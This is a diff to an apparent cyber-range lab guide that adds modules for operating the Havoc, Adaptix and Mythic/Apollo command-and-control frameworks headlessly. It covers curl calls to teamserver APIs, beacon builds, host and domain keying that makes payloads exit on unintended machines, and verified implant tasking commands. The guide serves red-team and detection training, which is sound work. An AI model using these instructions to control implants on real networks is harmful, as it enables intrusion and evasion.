@@ -364,10 +364,104 @@ Verify that all service status cards display **● RUNNING** in green.
    - Enable **Indirect Syscalls** and **Sleep Obfuscation (Ekko / Zilean)**.
 4. **Execute & Validate**:
    Execute the Demon on Windows member servers (`mbr01` or `ws01`). Verify via Process Hacker / Process Explorer that executable memory regions remain masked during sleep cycles.
+5. **Drive the Demon headlessly** (no GUI needed — the full vocabulary is in
+   `Docker/portal/havoc_client.py`, shapes extracted from the client's
+   `ConsoleInput.cc`/`CommandSend.cc` and the teamserver's `demons.go`):
+   ```bash
+   # via the portal API (native Demon syntax; a bare line runs as `shell`):
+   curl -s -X POST http://localhost:8000/api/ops/task \
+     -H 'Content-Type: application/json' \
+     -d '{"backend":"havoc","session_id":"<id>","command":"ls C:\\"}'
+   ```
+   Verified 2026-10-04 on ws01: `shell`, `powershell`, `ls/dir/pwd/cat/cp/mv/
+   mkdir/rm`, `ps`, `sleep`, `checkin`, `token list/getuid`, `config
+   implant.verbose`, `net domain`, `job list`, `task list` (14/14).
+   Traps: `CommandID` must be NUMERIC (a string is silently coerced to 0 and
+   the task is accepted but never runs); `ls` sends SubCommand `dir` (the
+   daemon has no `ls` case); `NetCommand` is numeric (`domain`=1, see
+   `DEMON_NET_COMMAND_*`); short replies arrive as `Message`-only frames;
+   omitting `FromProcessManager` on `ps` panics the teamserver.
 
 ---
 
-## 7. Real-World Defensive Telemetry & DFIR-Nexus Integration
+### Lab Module 4: Adaptix (Headless REST Operation)
+
+**Objective**: Run the entire Adaptix operator flow — listener, beacon build,
+tasking, results — with no Qt client, using the official REST API.
+
+1. **Authenticate** (teamserver password, not the operator one — see
+   `only_password` in `profile.yaml`):
+   ```bash
+   curl -sk -X POST https://<C2STACK_IP>:4321/endpoint/login \
+     -H 'Content-Type: application/json' \
+     -d '{"username":"operator1","password":"pass","version":"v1.2"}'
+   ```
+   A wrong password returns the Adaptix **404 decoy page**, not 401 — a 404
+   means "rejected", never "missing route".
+2. **Create the HTTP listener** (`POST /endpoint/listener/create`,
+   `type: BeaconHTTP`): bind `0.0.0.0:80`, URI `/api/v1/sync`, request header
+   `X-Request-ID: cadre-c2` (without it the redirector serves the decoy),
+   empty `host_header` list (skips the Host check the redirector would break),
+   `jitter` left at 0 (the vendored snapshot mixes seconds/milliseconds —
+   upstream PR #379).
+3. **Build the beacon** (`POST /endpoint/agent/generate`, `agent: beacon`,
+   single listener): the teamserver compiles with mingw g++ and returns
+   `base64(filename):base64(bytes)`.
+4. **Task with AxScript vocabulary** (NOT shell syntax — a bare `whoami` is
+   rejected): `getuid`, `ls <dir>`, `ps list`, `shell <cmdline>`,
+   `powershell <cmdline>`, `cd/cat/mkdir/rm/upload/download`, `sleep`,
+   `pwd`, `disks`.
+5. **Read results without WebSocket**: `GET /endpoint/agent/task/list`
+   returns completed tasks with `a_text` output.
+
+Verified 2026-10-04 on ws01 (11/11): `getuid`, `ls`, `pwd`, `ps list`,
+`shell`, `powershell`, `cat`, `disks`, `sleep`, `jobs list`, `cd`. The
+portal's Operations Console speaks this API natively (`/api/ops/adaptix/*`,
+full catalogue at `/api/ops/catalogues`).
+
+---
+
+### Lab Module 5: Mythic/Apollo (Headless Build Sweep)
+
+**Objective**: Build every Apollo output/keying variant through the REST API
+and verify each artifact plus its callback behavior.
+
+1. **Build via webhook**: `POST /api/v1.4/createpayload_webhook` with
+   `input.payloadDefinition` as a **JSON string** (object → unmarshal error)
+   containing `payload_type=apollo`, `selected_os=Windows`,
+   `build_parameters` as a **LIST of `{name, value}`** (dict → error, though
+   the build still queues with defaults), and `c2_profiles` with the `http`
+   profile. C2 shape that works: bare `callback_host`
+   (`http://<redir>`, NO port — OPSEC rejects ports) + full-path `post_uri`
+   (`/cdn/media/stream/data`) — a rooted `post_uri` REPLACES any base path
+   per `ParseURLAndPort`, so a path-carrying host + `data` silently phones
+   `http://host/data` into the decoy. Webhook replies arrive as CONCATENATED
+   JSON (`{...}{...}`) — parse defensively.
+2. **Sweep matrix** (all verified 2026-10-04): `output_type` WinExe/Shellcode/
+   Service/Source, `shellcode_format` Binary/Powershell, `debug=true`,
+   keying Hostname match/mismatch and Domain, `adjust_filename`.
+3. **Keying behavior**: a matching host calls back and tasks normally; a
+   mismatched host exits silently with zero callbacks. Domain keying compares
+   `Environment.UserDomainName` (NETBIOS, not FQDN). Registry keying is
+   **broken upstream** — any real path fails the build (`Config.cs: CS1009`,
+   the builder never escapes build-param backslashes).
+4. **Read task output from the `response` table**, not `task.stdout` (which
+   only ever holds the creation-time notice in this stack). The portal does
+   this for you: `/api/ops/task` returns inline `output`.
+5. **COFF loading** (verified live 2026-10-04): operator files upload via
+   `POST /api/v1.4/task_upload_file_webhook` (multipart field `file` — JSON
+   bodies get "Missing file in form") or the portal's
+   `POST /api/ops/mythic/upload`. Build payloads WITH the loader commands,
+   `register_file` the `.o` by filename ("Use Existing File"), then
+   `execute_coff {coff_name, function_name: go, timeout}`. A mingw-built
+   test object lives at `Docker/mythic/coff-test/cadre-test.x64.c`
+   (`x86_64-w64-mingw32-gcc -c`); its output `cadre-coff-ok` proves the
+   chain. Two traps, both verified: Beacon imports MUST be
+   `__declspec(dllimport)` (the loader only resolves `__imp_Beacon*` —
+   otherwise "RunCOFF failed with status: 1"), and `register_coff` needs the
+   exact uploaded filename.
+
+---
 
 When C2Stack is used against the CADRE range, it generates realistic blue-team telemetry across multiple sensor layers:
 
